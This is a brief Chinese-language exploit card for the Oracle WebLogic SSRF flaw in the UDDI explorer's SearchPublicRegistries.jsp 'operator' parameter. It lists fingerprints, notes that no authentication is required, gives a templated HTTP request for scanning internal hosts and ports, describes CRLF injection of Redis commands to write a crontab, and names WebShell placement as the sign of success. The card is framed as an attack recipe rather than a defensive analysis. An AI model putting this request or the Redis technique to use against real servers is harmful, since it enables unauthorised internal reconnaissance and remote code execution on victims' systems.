# WebLogic SSRF (ssrf)

## 指纹特征
- 服务: Oracle WebLogic Server
- 关键接口: `/uddiexplorer/SearchPublicRegistries.jsp`

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| operator SSRF 注入 | `/uddiexplorer/SearchPublicRegistries.jsp` | 无 |

## PoC 指令

通过构造畸形 SSRF 请求扫描内网或利用换行符注入 Redis 指令：

**1. 内网扫描**
```http
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://{{INTERNAL_IP}}:{{PORT}} HTTP/1.1
Host: {{TARGET}}:7001
```

**2. 攻击 Redis (写入 Crontab)**
使用换行符 `%0a%0d` 分隔 Redis 指令注入到目标 Redis。

## Success Signal
- **状态验证**: 返回不同的 HTTP 错误代码 (如端口关闭显示 500，开启显示其他响应)。
- **物理验证**: 执行预期的内网渗透攻击 (如写入 WebShell)。
